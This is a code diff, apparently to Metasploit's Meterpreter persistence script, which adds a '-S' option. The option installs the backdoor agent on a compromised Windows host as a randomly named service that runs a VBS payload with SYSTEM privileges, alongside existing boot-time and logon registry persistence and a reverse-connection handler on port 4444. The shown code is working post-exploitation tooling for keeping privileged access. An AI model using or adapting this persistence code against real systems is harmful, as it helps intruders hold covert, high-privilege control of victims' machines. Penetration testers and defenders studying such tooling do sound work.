@@ -23,6 +23,7 @@ opts = Rex::Parser::Arguments.new(
 	"-i"  => [ true,   "The interval in seconds between each connection attempt"],
 	"-X"  => [ false,  "Automatically start the agent when the system boots"],
 	"-U"  => [ false,  "Automatically start the agent when the User logs on"],
+	"-S"  => [ false,  "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
 	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"]
 )
 
@@ -35,6 +36,7 @@ rport = 4444
 delay = 5
 install = false
 autoconn = false
+serv = false
 ##
 
 #
@@ -54,6 +56,8 @@ opts.parse(args) do |opt, idx, val|
 	when "-X"
 		install = true
 		key = "HKLM"
+	when "-S"
+		serv = true
 	when "-U"
 		install = true
 		key = "HKCU"
@@ -139,5 +143,11 @@ if(install)
 	else
 		print_status("Error: failed to open the registry key for writing")
 	end
+end
+if(serv)
+	nam = Rex::Text.rand_text_alpha(rand(8)+8)
+	print_status("Creating service #{nam}")
+	service_create(nam, nam, "wscript \"#{tempvbs}\"")
+	file_local_write(dest, "execute -H -f sc -a \"delete #{nam}\"\n")
 end
 print_status("For cleanup use command: run multi_console_command -rc #{dest}")
